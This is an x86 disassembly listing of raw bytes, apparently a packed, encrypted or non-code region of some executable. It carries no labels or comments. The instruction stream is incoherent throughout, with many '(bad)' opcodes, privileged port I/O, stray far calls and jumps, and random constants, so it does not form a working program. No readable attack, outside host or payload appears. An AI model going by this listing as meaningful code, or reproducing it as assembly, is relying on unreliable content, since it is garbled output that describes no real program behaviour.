  412c73:	push   edx
  412c74:	ss stc 
  412c76:	imul   eax,DWORD PTR [edi+0x26],0xffffff8c
  412c7a:	icebp  
  412c7b:	mov    ebx,0x6cf4f3eb
  412c80:	into   
  412c81:	mov    ds:0x66ea3bec,eax
  412c86:	ds jecxz 0x412c0c
  412c89:	shr    bh,cl
  412c8b:	mov    esi,0x861eb70a
  412c90:	or     eax,0x422d8457
  412c95:	add    BYTE PTR [ecx+edi*4+0x14],cl
  412c99:	inc    esi
  412c9a:	call   0xdcfa:0x635834af
  412ca1:	sub    al,0xc7
  412ca3:	aad    0xe8
  412ca5:	mov    ebx,esp
  412ca7:	add    bl,BYTE PTR [ecx+0xf]
  412caa:	inc    esp
  412cab:	sbb    al,0xe9
  412cad:	scas   al,BYTE PTR es:[edi]
  412cae:	addr16 push ebx
  412cb0:	mov    edi,0x5940baef
  412cb5:	cwde   
  412cb6:	fstp   TBYTE PTR [edi-0x7ba438b2]
  412cbc:	mov    edi,0x7ee4a21c
  412cc1:	xor    al,0xde
  412cc3:	rol    BYTE PTR [edx+0x16518b11],1
  412cc9:	inc    ebx
  412cca:	test   dh,ch
  412ccc:	fcmovb st,st(7)
  412cce:	adc    DWORD PTR [ecx+0x1b],esi
  412cd1:	sub    DWORD PTR [ebx-0x6e],ebp
  412cd4:	mov    eax,ds:0xaf9e2ade
  412cd9:	add    DWORD PTR [edx+ebx*8],ebx
  412cdc:	dec    ecx
  412cdd:	xchg   edx,eax
  412cde:	in     eax,dx
  412cdf:	push   cs
  412ce0:	mov    dh,0x6c
  412ce2:	dec    ebx
  412ce3:	fs stos BYTE PTR es:[edi],al
  412ce5:	xor    BYTE PTR [eax+esi*8-0x47],cl
  412ce9:	push   es
  412cea:	push   ebp
  412ceb:	lds    esp,FWORD PTR [eax+0x58]
  412cee:	inc    ecx
  412cef:	dec    edx
  412cf0:	fist   WORD PTR [edi+0x4c564473]
  412cf6:	xor    BYTE PTR [esi+0x6fb264e4],ah
  412cfc:	stos   DWORD PTR es:[edi],eax
  412cfd:	imul   ebx,DWORD PTR [eax],0xd1652898
  412d03:	add    eax,0x75dbd27f
  412d08:	or     al,0xb7
  412d0a:	dec    ah
  412d0c:	push   eax
  412d0d:	lods   al,BYTE PTR ds:[esi]
  412d0e:	pusha  
  412d0f:	mov    fs,WORD PTR [eax+0x2d]
  412d12:	mov    edi,0xb8381d28
  412d17:	aas    
  412d18:	cmc    
  412d19:	jp     0x412cea
  412d1b:	mov    ch,0x1
  412d1d:	cmp    eax,0xf9f4602b
  412d22:	xchg   edx,eax
  412d23:	out    0x52,eax
  412d25:	adc    eax,0xab5319c1
  412d2a:	ret    0x957
  412d2d:	lods   al,BYTE PTR ds:[esi]
  412d2e:	pop    ecx
  412d2f:	outs   dx,DWORD PTR ds:[esi]
  412d30:	sti    
  412d31:	loopne 0x412ccf
  412d33:	jle    0x412d52
  412d35:	jne    0x412d8b
  412d37:	sbb    dl,BYTE PTR [ebp+0x67]
  412d3a:	daa    
  412d3b:	inc    BYTE PTR [ecx+edi*4-0x23cea32]
  412d42:	adc    al,0x11
  412d44:	sub    DWORD PTR [edx],eax
  412d46:	push   esi
  412d47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d48:	aaa    
  412d49:	(bad)  
  412d4b:	fsub   DWORD PTR [edi]
  412d4d:	add    ecx,DWORD PTR [ebx+ecx*4]
  412d50:	cs push ss
  412d52:	xchg   esi,eax
  412d53:	mov    ds:0xc9750bf3,eax
  412d58:	add    eax,0x113a7cee
  412d5d:	cld    
  412d5e:	add    edx,0xfffffff9
  412d61:	jb     0x412dce
  412d63:	xchg   DWORD PTR [edi],ecx
  412d65:	xor    bl,bh
  412d67:	cmc    
  412d68:	sub    ebx,DWORD PTR [ebp+0x4c163fb2]
  412d6e:	call   FWORD PTR [esp+esi*1]
  412d71:	scas   eax,DWORD PTR es:[edi]
  412d72:	loope  0x412d55
  412d74:	add    eax,0x75c9be12
  412d79:	dec    edi
  412d7a:	(bad)  
  412d7b:	jmp    0x7c55:0x93e628f1
  412d82:	test   DWORD PTR [edx],esi
  412d84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d85:	add    dh,bl
  412d87:	jp     0x412d1f
  412d89:	cmp    esi,DWORD PTR [ebx]
  412d8b:	pushf  
  412d8c:	cmp    al,0x46
  412d8e:	sar    esi,cl
  412d90:	jg     0x412dbe
  412d92:	mov    dh,0x6f
  412d94:	jmp    0xfe81b40b
  412d99:	cmp    ebp,ebp
  412d9b:	xchg   bl,bh
  412d9d:	inc    edi
  412d9e:	push   0x308c7b1e
  412da3:	cs pop esp
  412da5:	jne    0x412d91
  412da7:	inc    ecx
  412da8:	ins    BYTE PTR es:[edi],dx
  412da9:	cmp    bl,BYTE PTR [eax-0x7cc54266]
  412daf:	por    mm3,mm7
  412db2:	mov    eax,ds:0x6a1f380f
  412db7:	jmp    0xbff3a54a
  412dbc:	test   eax,0x7e2e60c
  412dc1:	jb     0x412dcd
  412dc3:	xor    BYTE PTR [ebp-0x61],dl
  412dc6:	ins    BYTE PTR es:[edi],dx
  412dc7:	inc    ecx
  412dc8:	(bad)  
  412dc9:	(bad)
  412dcc:	bound  eax,QWORD PTR [ecx]
  412dce:	mov    esi,DWORD PTR [eax-0x4b978d5a]
  412dd4:	(bad)  
  412dd5:	cli    
  412dd6:	mov    ecx,DWORD PTR [ebp-0x35e2fafa]
  412ddc:	lock xor eax,0x1d87f51c
  412de2:	(bad)  
  412de3:	stc    
  412de4:	add    DWORD PTR [ebx+0x2a],0x2
  412de8:	imul   ebx,DWORD PTR ds:0xb343bae4,0x804a5f07
  412df2:	lahf   
  412df3:	sahf   
  412df4:	and    al,0x5e
  412df6:	cmp    ecx,edi
  412df8:	test   eax,0x9b68ca7
  412dfd:	aas    
  412dfe:	lahf   
  412dff:	xchg   ebx,eax
  412e00:	and    eax,0xb3fb7013
  412e05:	fisub  DWORD PTR [eax+eax*4]
  412e08:	cwde   
  412e09:	ds lock push 0x9fb168cf
  412e10:	into   
  412e11:	pop    ds
  412e12:	adc    ch,al
  412e14:	jecxz  0x412dbb
  412e16:	loope  0x412dae
  412e18:	loop   0x412e4c
  412e1a:	loop   0x412deb
  412e1c:	fwait
  412e1d:	test   BYTE PTR [edi+0x7bec6582],al
  412e23:	aaa    
  412e24:	stos   BYTE PTR es:[edi],al
  412e25:	addr16 inc esp
  412e27:	aad    0x25
  412e29:	adc    DWORD PTR [edi-0x6e0cddc3],0xffffffa2
  412e30:	mov    cl,0x33
  412e32:	inc    esp
  412e33:	lods   al,BYTE PTR ds:[esi]
  412e34:	test   al,0x15
  412e36:	mov    ebx,0x42863d8f
  412e3b:	add    eax,0x68a42d7e
  412e40:	les    edx,FWORD PTR [eax-0x54]
  412e43:	pusha  
  412e44:	pop    ebx
  412e45:	sahf   
  412e46:	les    edi,FWORD PTR [ebp+0x5d]
  412e49:	and    ch,BYTE PTR [ebx-0x68]
  412e4c:	mov    WORD PTR [edx],cs
  412e4e:	adc    bh,BYTE PTR [edi-0x3b]
  412e51:	pushf  
  412e52:	ss retf 
  412e54:	lea    edi,[ebp-0x1b2668b9]
  412e5a:	pop    eax
  412e5b:	pusha  
  412e5c:	and    al,0x2
  412e5e:	rcl    al,0x38
  412e61:	xchg   ebx,eax
  412e62:	cli    
  412e63:	repnz dec edi
  412e65:	jo     0x412e16
  412e67:	stc    
  412e68:	cmp    esp,eax
  412e6a:	lahf   
  412e6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e6c:	cdq    
  412e6d:	pop    ss
  412e6e:	aad    0xcd
  412e70:	rcl    DWORD PTR [edi+0x435ae7e6],cl
  412e76:	in     al,dx
  412e77:	addr16 dec ebp
  412e79:	sahf   
  412e7a:	xor    esi,DWORD PTR [edi+0x6fbb20ee]
  412e80:	inc    ecx
  412e81:	jns    0x412ee7
  412e83:	int3   
  412e84:	daa    
  412e85:	xchg   esp,eax
  412e86:	pop    eax
  412e87:	out    0x9c,eax
  412e89:	xlat   BYTE PTR ds:[ebx]
  412e8a:	bnd jp 0x412e30
  412e8d:	mov    edx,0x7733cdfb
  412e92:	xor    eax,0x5e7e6b29
  412e97:	jae    0x412e8d
  412e99:	and    dh,dh
  412e9b:	mov    ecx,0x614cf078
  412ea0:	outs   dx,BYTE PTR ds:[esi]
  412ea1:	popa   
  412ea2:	call   DWORD PTR [ecx+0x60a022c6]
  412ea8:	jle    0x412f19
  412eaa:	mov    eax,ds:0x58625287
  412eaf:	ds aam 0x25
  412eb2:	iret   
  412eb3:	ja     0x412eaa
  412eb5:	sub    DWORD PTR [eax+0x2a4161ee],esp
  412ebb:	ins    BYTE PTR es:[edi],dx
  412ebc:	xchg   BYTE PTR [eax+edx*2-0x4c9869d9],dl
  412ec3:	dec    ebx
  412ec4:	jp     0x412f05
  412ec6:	pusha  
  412ec7:	sub    eax,0x6f567ec4
  412ecc:	shl    BYTE PTR [ebx],1
  412ece:	jne    0x412f40
  412ed0:	ror    BYTE PTR [esi-0x4f],cl
  412ed3:	and    dh,bl
  412ed5:	push   ecx
  412ed6:	cmp    ecx,DWORD PTR [ebx-0x72844e35]
  412edc:	(bad)  
  412edd:	sbb    BYTE PTR [edx-0x29c55083],dh
  412ee3:	icebp  
  412ee4:	imul   ebp,ebx,0x1970a4a
  412eea:	push   es
  412eeb:	out    dx,eax
  412eec:	jge    0x412efe
  412eee:	data16 test BYTE PTR [edi-0x5],0x7
  412ef3:	repnz add ah,BYTE PTR [ebp-0x2401c794]
  412efa:	jecxz  0x412f40
  412efc:	shl    dl,cl
  412efe:	lahf   
  412eff:	jecxz  0x412f6c
  412f01:	les    ebx,FWORD PTR [edx]
  412f03:	jo     0x412e94
  412f05:	outs   dx,BYTE PTR ds:[esi]
  412f06:	jmp    0x7580190a
  412f0b:	mov    edx,0x4d7fb2a6
  412f10:	mov    bl,0x32
  412f12:	jmp    0x9e78:0x1c5b4e6e
  412f19:	mov    bl,0xb4
  412f1b:	cvtps2pi mm5,QWORD PTR [ecx-0x7b26e997]
  412f22:	aaa    
  412f23:	sbb    dh,bl
  412f25:	pop    esp
  412f26:	or     DWORD PTR [esi],esp
  412f28:	aad    0xc9
  412f2a:	in     al,dx
  412f2b:	into   
  412f2c:	dec    ecx
  412f2d:	pop    ss
  412f2e:	in     eax,0x4b
  412f30:	sub    DWORD PTR [edx+0x4d5bedad],eax
  412f36:	je     0x412f97
  412f38:	mov    edx,0x6e4551e2
  412f3d:	scas   eax,DWORD PTR es:[edi]
  412f3e:	bnd je 0x412edd
  412f41:	or     eax,0x4e461a68
  412f46:	cs mov ebp,0x85f57733
  412f4c:	addr16 mov eax,0x91f856e5
  412f52:	in     al,dx
  412f53:	cld    
  412f54:	icebp  
  412f55:	cld    
  412f56:	jno    0x412f2a
  412f58:	sbb    eax,0xdb910797
  412f5d:	call   0xc7be:0x36a35a16
  412f64:	xor    DWORD PTR [esi+0x7],ecx
  412f67:	dec    ebp
  412f68:	sub    BYTE PTR [ebx+0x1c],al
  412f6b:	or     edx,ecx
  412f6d:	sub    DWORD PTR [edx-0xa],esp
  412f70:	xor    DWORD PTR [edi-0x5464730],esi
  412f76:	out    0x96,al
  412f78:	ret    0xd461
  412f7b:	(bad)  
  412f7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f7d:	sub    edi,edx
  412f7f:	inc    esi
  412f80:	pop    edx
  412f81:	(bad)  
  412f82:	pusha  
  412f83:	xor    al,0xc7
  412f85:	fcomp  DWORD PTR [ecx-0x22]
  412f88:	les    edx,FWORD PTR [edi]
  412f8a:	(bad)  
  412f8b:	and    dl,BYTE PTR [eax]
  412f8d:	pop    esi
  412f8e:	jno    0x412f9c
  412f90:	inc    edi
  412f91:	imul   ecx,DWORD PTR [edx+0x5b],0xcda996d7
  412f98:	xchg   ebx,eax
  412f99:	push   esi
  412f9a:	or     al,0xc1
  412f9c:	daa    
  412f9d:	retf   
  412f9e:	loope  0x413001
  412fa0:	imul   BYTE PTR [ebx+0x59]
  412fa3:	data16 cld 
  412fa5:	sti    
  412fa6:	icebp  
  412fa7:	imul   esi,DWORD PTR [eax],0x5f68a93c
  412fad:	ret    
  412fae:	xor    DWORD PTR [esi+0x10d02ba8],ebx
  412fb4:	leave  
  412fb5:	mov    BYTE PTR [ecx-0x5f],dh
  412fb8:	mov    esi,0x2bc739cc
  412fbd:	jmp    0x412fc7
  412fbf:	sahf   
  412fc0:	pusha  
  412fc1:	cmp    al,0x8f
  412fc3:	stos   BYTE PTR es:[edi],al
  412fc4:	mov    ebx,0xa13eed18
  412fc9:	fld    DWORD PTR [eax-0x1a4d73cb]
  412fcf:	paddsw mm6,mm6
  412fd2:	and    edi,edi
  412fd4:	pop    edx
  412fd5:	add    al,0x4
  412fd7:	mov    dh,0xa8
  412fd9:	cmp    BYTE PTR [edi+0x3d],al
  412fdc:	pop    esp
  412fdd:	sti    
  412fde:	pop    ebp
  412fdf:	mov    ds:0xceb56b7b,eax
  412fe4:	push   es
  412fe5:	jmp    0x57c786cc
  412fea:	mov    bl,0x3a
  412fec:	mov    DWORD PTR [edx],esp
  412fee:	or     al,0x27
  412ff0:	dec    edi
  412ff1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ff2:	jle    0x412fbd
  412ff4:	mov    al,ds:0x419daf6b
  412ff9:	mov    BYTE PTR [edx],ah
  412ffb:	cli    
  412ffc:	xchg   edi,eax
  412ffd:	mov    edi,DWORD PTR [eax]
  412fff:	sbb    eax,0x1a6f0d9f
  413004:	(bad)  
  413005:	jnp    0x412fd8
  413007:	xor    DWORD PTR ds:0x62a41eaf,ecx
  41300d:	enter  0x7682,0xac
  413011:	rcr    BYTE PTR [ecx],0xc
  413014:	int3   
  413015:	vpsraw ymm0,ymm4,XMMWORD PTR [edi]
  413019:	jbe    0x412fb5
  41301b:	sub    DWORD PTR [ecx],edi
  41301d:	xor    ah,bl
  41301f:	xchg   BYTE PTR [eax+ebp*8-0x66ec7b90],dh
  413026:	inc    edi
  413027:	lds    esp,FWORD PTR [esi+eax*8+0x24123108]
  41302e:	das    
  41302f:	adc    edi,edi
  413031:	retf   0x18ee
  413034:	fnstsw WORD PTR [ebp+0x4e07657f]
  41303a:	cwde   
  41303b:	loop   0x413077
  41303d:	lock repz or ecx,DWORD PTR [esi+0x74]
  413042:	(bad)  
  413043:	mov    eax,0xf0ffc902
  413048:	sub    cl,BYTE PTR [edx-0x38]
  41304b:	push   ss
  41304c:	jecxz  0x413073
  41304e:	and    BYTE PTR [eax+0x50],0x32
  413052:	and    ecx,esi
  413054:	jp     0x413083
  413056:	pusha  
  413057:	mov    ch,0xf6
  413059:	cli    
  41305a:	xchg   BYTE PTR [ebp+0x7b],bh
  41305d:	call   0xfe1:0x79c3eb2e
  413064:	and    al,0xcd
  413066:	fsubrp st(4),st
  413068:	(bad)
  41306c:	push   cs
  41306d:	mov    eax,ds:0x73a49376
  413072:	test   ebx,0x7d039dc5
  413078:	das    
  413079:	sbb    dh,cl
  41307b:	add    ebp,ecx
  41307d:	mov    al,0xdf
  41307f:	jnp    0x4130dd
  413081:	ins    BYTE PTR es:[edi],dx
  413082:	loope  0x41306b
  413084:	pop    ebp
  413085:	push   cs
  413086:	mov    ebx,0xa84356bf
  41308b:	fcomp  DWORD PTR [eax-0x5d]
  41308e:	and    eax,0xc060b558
  413093:	mov    al,es:0xf3ea2c66
  413099:	xor    al,0xbc
  41309b:	arpl   WORD PTR [edi-0x5],bx
  41309e:	lea    ecx,[eax-0x48]
  4130a1:	mov    eax,ds:0x8f81f1d9
  4130a6:	xor    eax,0xba66488b
  4130ab:	mov    ecx,0xbfdd2a25
  4130b0:	mov    bl,0x61
  4130b2:	(bad)  
  4130b3:	clc    
  4130b4:	mov    dh,BYTE PTR [ebx+eiz*2]
  4130b7:	mov    ecx,0x2b732ab9
  4130bc:	inc    ecx
  4130bd:	or     dh,ch
  4130bf:	sar    BYTE PTR [esi+0x3b20ba21],0xb4
  4130c6:	xor    cl,cl
  4130c8:	push   ecx
  4130c9:	rcr    BYTE PTR [eax],0x8
  4130cc:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130ce:	call   0x96f7:0x6639daac
  4130d5:	pop    es
  4130d6:	lahf   
  4130d7:	inc    edi
  4130d8:	sub    ah,0x20
  4130db:	ret    0xe334
  4130de:	dec    ebx
  4130df:	dec    esp
  4130e0:	jbe    0x41311f
  4130e2:	in     eax,dx
  4130e3:	loope  0x4130d7
  4130e5:	cmp    BYTE PTR [edx+0x1],0x59
  4130e9:	mov    WORD PTR [ebx],cs
  4130eb:	ins    BYTE PTR es:[edi],dx
  4130ec:	dec    ebp
  4130ed:	or     DWORD PTR [ebp+0x1f89df23],esp
  4130f3:	dec    ebp
  4130f4:	into   
  4130f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130f6:	mov    ebx,0x531f1a94
  4130fb:	mov    al,0x9d
  4130fd:	push   ecx
  4130fe:	fcom   DWORD PTR [eax]
  413100:	jne    0x4130f8
  413102:	iret   
  413103:	mul    BYTE PTR [edx+0x4]
  413106:	ss fwait
  413108:	push   ecx
  413109:	jmp    0xaabf:0x945c08e3
  413110:	je     0x41316d
  413112:	inc    esp
  413113:	jns    0x413142
  413115:	mov    bl,0xcc
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	adc    al,0xfa
  41311a:	mov    al,0xb0
  41311c:	xor    DWORD PTR [edx-0x12],edi
  41311f:	imul   edi,DWORD PTR [edx],0x1
  413122:	les    ebx,FWORD PTR [esi]
  413124:	fsubr  DWORD PTR [ebx+0x74b136f]
  41312a:	inc    ebx
  41312b:	in     al,0x37
  41312d:	mov    bl,0x3b
  41312f:	dec    esp
  413130:	lods   eax,DWORD PTR ds:[esi]
  413131:	xor    cl,dl
  413133:	push   0xffffffd3
  413135:	(bad)  
  413137:	push   ss
  413138:	cwde   
  413139:	test   eax,0xdd2a70cd
  41313e:	xor    edx,ebx
  413140:	(bad)  
  413141:	push   ebp
  413142:	sub    eax,0xf08d543e
  413147:	repz out 0x2e,eax
  41314a:	jmp    0x8485fdc2
  41314f:	cld    
  413150:	adc    esp,DWORD PTR [ebx]
  413152:	jne    0x413137
  413154:	jle    0x41313b
  413156:	outs   dx,BYTE PTR ds:[esi]
  413157:	or     eax,0x19ed27b0
  41315c:	pop    esp
  41315d:	and    al,0xd7
  41315f:	outs   dx,BYTE PTR ds:[esi]
  413160:	push   ss
  413161:	jne    0x4131bf
  413163:	sbb    BYTE PTR [ebx],bl
  413165:	or     eax,0x76f33ed8
  41316a:	rcl    BYTE PTR [ebx+edx*4-0x4608e58d],1
  413171:	add    al,0x9c
  413173:	je     0x4131b3
  413175:	out    0x46,al
  413177:	add    BYTE PTR [ebp-0x22],0xb3
  41317b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41317c:	je     0x41312e
  41317e:	leave  
  41317f:	add    bl,BYTE PTR [ebx+0x5894277]
  413185:	cmp    al,0x16
  413187:	push   ecx
  413188:	or     ecx,DWORD PTR [ecx+0x13]
  41318b:	mov    ebx,0xb7f33632
  413190:	and    dl,BYTE PTR [ebp-0x11]
  413193:	lock jp 0x413141
  413196:	sbb    BYTE PTR [esi+0x6ed0e3a0],dl
  41319c:	inc    esi
  41319d:	rol    BYTE PTR [ecx+0x3d9524cd],cl
  4131a3:	stos   BYTE PTR es:[edi],al
  4131a4:	xchg   esp,eax
  4131a5:	mov    eax,ds:0x7f155fd2
  4131aa:	add    esp,DWORD PTR [edi+0x50]
  4131ad:	sbb    BYTE PTR [edx+eiz*4+0x4f],bl
  4131b1:	xchg   ebp,eax
  4131b2:	repz jl 0x4131ce
  4131b5:	cdq    
  4131b6:	or     BYTE PTR [eax],ch
  4131b8:	and    dl,cl
  4131ba:	pusha  
  4131bb:	gs mov ch,0x84
  4131be:	cli    
  4131bf:	retf   
  4131c0:	pop    ds
  4131c1:	mov    eax,0xac6337e6
  4131c6:	mov    al,ds:0xbfc8e72e
  4131cb:	pusha  
  4131cc:	xchg   esi,eax
  4131cd:	fistp  QWORD PTR [edi+0x53b879b8]
  4131d3:	jbe    0x4131db
  4131d5:	mov    bh,0x5e
  4131d7:	lds    eax,FWORD PTR [ecx-0x20]
  4131da:	popf   
  4131db:	inc    ebx
  4131dc:	jb     0x4131b1
  4131de:	sbb    ebp,eax
  4131e0:	sbb    BYTE PTR [ebx+0x60db072e],dh
  4131e6:	popa   
  4131e7:	push   ds
  4131e8:	ins    DWORD PTR es:[edi],dx
  4131e9:	lods   eax,DWORD PTR ds:[esi]
  4131ea:	sbb    al,0x2
  4131ec:	ja     0x413257
  4131ee:	fsubr  st,st(7)
  4131f0:	sar    DWORD PTR [esi],cl
  4131f2:	mov    dl,0xc2
  4131f4:	xor    eax,0xfac2f1dc
  4131f9:	or     DWORD PTR [eax+0x4ed086cd],0x13
  413200:	pusha  
  413201:	aam    0x7d
  413203:	fcmovnb st,st(4)
  413205:	and    dl,BYTE PTR ds:0xccbf6c30
  41320b:	in     al,0x44
  41320d:	mov    ebp,0xf3781d38
  413212:	mov    dl,0xc0
  413214:	jo     0x413266
  413216:	rcr    BYTE PTR ds:0xac94f5b9,1
  41321c:	fwait
  41321d:	cmp    eax,0x8a8310d5
  413222:	cmp    eax,0xe489983a
  413227:	rcl    BYTE PTR ds:0x9949b2d9,cl
  41322d:	pop    ebp
  41322e:	jae    0x41328f
  413230:	arpl   WORD PTR [ebp+0x47],cx
  413233:	pop    esp
  413234:	lods   eax,DWORD PTR ds:[esi]
  413235:	arpl   WORD PTR [ecx-0x5f],bx
  413238:	nop
  413239:	sbb    eax,DWORD PTR [eax]
  41323b:	adc    al,cl
  41323d:	jmp    0xaa585049
  413242:	aam    0x9e
  413244:	push   ebx
  413245:	add    al,BYTE PTR [edi+0x54a4562c]
  41324b:	clc    
  41324c:	jns    0x4132ac
  41324e:	mov    bl,0xe0
  413250:	not    DWORD PTR [edx+0x78]
  413253:	outs   dx,BYTE PTR ds:[esi]
  413254:	sbb    eax,ecx
  413256:	inc    ebp
  413257:	jb     0x413286
  413259:	cld    
  41325a:	push   ss
  41325b:	aaa    
  41325c:	fwait
  41325d:	shl    BYTE PTR [ebx+0x6f],cl
  413260:	aad    0xe0
  413262:	mov    DWORD PTR [ebx-0x65],esp
  413265:	in     eax,0xcb
  413267:	jmp    0x2e01:0xaac160bd
  41326e:	jmp    0x413246
  413270:	imul   esp,DWORD PTR ds:0x431b1531,0x887605ec
  41327a:	pop    ecx
  41327b:	into   
  41327c:	dec    ecx
  41327d:	inc    ebx
  41327e:	xchg   esi,eax
  41327f:	cmp    ah,BYTE PTR [edi-0x375b2357]
  413285:	add    ah,BYTE PTR [ebp+0x27]
  413288:	outs   dx,BYTE PTR ds:[esi]
  413289:	int3   
  41328a:	das    
  41328b:	mov    edi,0x3f788d02
  413290:	jp     0x4132fd
  413292:	pop    es
  413293:	xchg   DWORD PTR [edi],edi
  413295:	ins    DWORD PTR es:[edi],dx
  413296:	dec    edi
  413297:	jbe    0x413267
  413299:	sahf   
  41329a:	inc    edi
  41329b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41329c:	shl    bl,1
  41329e:	rol    BYTE PTR [ecx+0x10],0x85
  4132a2:	jb     0x41328d
  4132a4:	std    
  4132a5:	push   cs
  4132a6:	or     ebp,esi
  4132a8:	xor    al,0x25
  4132aa:	adc    al,0x1c
  4132ac:	mov    al,ds:0xb255d18b
  4132b1:	les    esp,FWORD PTR [edi+0x2a]
  4132b4:	fld    QWORD PTR [ebx]
  4132b6:	inc    edx
  4132b7:	add    esi,DWORD PTR [ecx-0x446f7eb4]
  4132bd:	mov    esp,0x876df300
  4132c2:	icebp  
  4132c3:	sub    BYTE PTR [edx-0x26],cl
  4132c6:	push   esp
  4132c7:	inc    esp
  4132c8:	aam    0x69
  4132ca:	enter  0xfe7f,0xb1
  4132ce:	ss and al,0xba
  4132d1:	and    ecx,DWORD PTR [esi]
  4132d3:	sbb    al,0x8a
  4132d5:	hlt    
  4132d6:	inc    esi
  4132d7:	shl    BYTE PTR [ebx],cl
  4132d9:	test   esi,0x98c35f8c
  4132df:	push   ebx
  4132e0:	sbb    DWORD PTR [ecx+0x69],esi
  4132e3:	xchg   ebp,eax
  4132e4:	jae    0x413266
  4132e6:	cmp    bl,BYTE PTR [ebx]
  4132e8:	test   eax,edx
  4132ea:	fwait
  4132eb:	mov    dh,0x2b
  4132ed:	inc    dh
  4132ef:	ins    DWORD PTR es:[edi],dx
  4132f0:	add    eax,0xf5111bba
  4132f5:	pop    esp
  4132f6:	sbb    bl,BYTE PTR [esi]
  4132f8:	outs   dx,DWORD PTR ds:[esi]
  4132f9:	(bad)  
  4132fa:	into   
  4132fb:	iret   
  4132fc:	or     al,0x61
  4132fe:	xor    DWORD PTR [ebx+0x71],edx
  413301:	div    bh
  413303:	arpl   WORD PTR [edi+0x36],bp
  413306:	pusha  
  413307:	push   edx
  413308:	mov    dl,0x4c
  41330a:	div    DWORD PTR [eax]
  41330c:	gs and eax,0xed6d3694
  413312:	cld    
  413313:	sbb    BYTE PTR [ebp+0x50217198],al
  413319:	outs   dx,BYTE PTR ds:[esi]
  41331a:	mov    dh,0xe6
  41331c:	mov    bh,0xda
  41331e:	popf   
  41331f:	inc    eax
  413320:	aam    0x50
  413322:	push   ds
  413323:	leave  
  413324:	stos   BYTE PTR es:[edi],al
  413325:	pop    es
  413326:	sub    dl,dh
  413328:	mov    ebx,0xbe332a73
  41332d:	dec    esp
  41332e:	scas   eax,DWORD PTR es:[edi]
  41332f:	loopne 0x4132f7
  413331:	sbb    al,0x33
  413333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413334:	pop    es
  413335:	test   BYTE PTR [ecx+0x5d1043db],dh
  41333b:	rcl    DWORD PTR [esi-0x72],1
  41333e:	add    BYTE PTR [edx-0x32feb0f1],al
  413344:	stos   BYTE PTR es:[edi],al
  413345:	mov    ecx,esp
  413347:	sbb    eax,0x8c757227
  41334c:	dec    ebp
  41334d:	push   es
  41334e:	push   0x4673cd3e
  413353:	pop    esp
  413354:	jg     0x41330b
  413356:	mov    BYTE PTR [esi-0x5],0x37
  41335a:	pop    ds
  41335b:	test   esi,esi
  41335d:	jle    0x41331d
  41335f:	adc    bh,BYTE PTR [ebp+0x55]
  413362:	sbb    eax,0x5d00e753
  413367:	shl    DWORD PTR [ecx-0x63],cl
  41336a:	ins    DWORD PTR es:[edi],dx
  41336b:	out    0x88,eax
  41336d:	mov    WORD PTR [ebp+ebx*1+0x113b71c],cs
  413374:	dec    eax
  413375:	ror    DWORD PTR [edx-0x3fb529b3],1
  41337b:	mov    ch,0xc5
  41337d:	mov    al,ds:0x64244d30
  413382:	mov    bl,0x1e
  413384:	pop    ss
  413385:	imul   esp,edx,0x54
  413388:	sub    eax,0x9f036669
  41338d:	mov    ds:0x816b22f5,eax
  413392:	pushf  
  413393:	dec    ebp
  413394:	into   
  413395:	xor    al,0x1d
  413397:	mov    ebx,0x9d7014a0
  41339c:	(bad)  
  41339d:	fs nop edi
  4133a1:	pop    edi
  4133a2:	pop    edx
  4133a3:	je     0x413409
  4133a5:	neg    bh
  4133a7:	dec    edx
  4133a8:	xchg   dl,al
  4133aa:	and    DWORD PTR [edi-0x3],edi
  4133ad:	mov    edx,0x2ade6690
  4133b2:	in     eax,dx
  4133b3:	(bad)  
  4133b4:	lods   al,BYTE PTR ds:[esi]
  4133b5:	mov    al,ds:0xd7d68ea4
  4133ba:	inc    ecx
  4133bb:	push   ebx
  4133bc:	aas    
  4133bd:	repnz scas al,BYTE PTR es:[edi]
  4133bf:	fsub   st,st(3)
  4133c1:	or     esi,edi
  4133c3:	clc    
  4133c4:	mov    es,WORD PTR [edx-0x2c]
  4133c7:	sbb    DWORD PTR [edi],0xa878a930
  4133cd:	cmp    DWORD PTR [edi-0x42ecc22a],edx
  4133d3:	or     esi,ebp
  4133d5:	cmp    BYTE PTR [esi+0x46e2f065],dh
  4133db:	jl     0x413380
  4133dd:	and    esp,esp
  4133df:	ja     0x4133de
  4133e1:	fcomp  QWORD PTR [esi+0x20ff0288]
  4133e7:	mov    al,ds:0x6e488e9b
  4133ec:	fsubr  QWORD PTR [ecx-0x26]
  4133ef:	fisubr WORD PTR [edi+0x68029e62]
  4133f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133f6:	je     0x4133d6
  4133f8:	pop    ebx
  4133f9:	sbb    eax,0x94225803
  4133fe:	xchg   cl,cl
  413400:	pop    esp
  413401:	pop    ecx
  413402:	xchg   edi,eax
  413403:	mov    ch,0x50
  413405:	stos   DWORD PTR es:[edi],eax
  413406:	mov    ebp,?
  413408:	fnstcw WORD PTR [esi+ebp*8+0x1501f7d5]
  41340f:	stos   BYTE PTR es:[edi],al
  413410:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  413412:	nop
  413413:	mov    bl,0x43
  413415:	sub    bh,BYTE PTR [edi]
  413417:	outs   dx,BYTE PTR ds:[esi]
  413418:	adc    ebx,ecx
  41341a:	imul   esi,DWORD PTR [ebx+0x39],0xec980845
  413421:	cld    
  413422:	dec    esp
  413423:	add    al,0xbd
  413425:	mov    ch,0xdd
  413427:	daa    
  413428:	pop    ecx
  413429:	push   edi
  41342a:	jl     0x41343e
  41342c:	inc    esi
  41342d:	jge    0x41347d
  41342f:	mov    bh,BYTE PTR [esi-0x60]
  413432:	fisttp DWORD PTR [ebx]
  413434:	ins    BYTE PTR es:[edi],dx
  413435:	shl    DWORD PTR [esi],cl
  413437:	nop
  413438:	ins    DWORD PTR es:[edi],dx
  413439:	nop
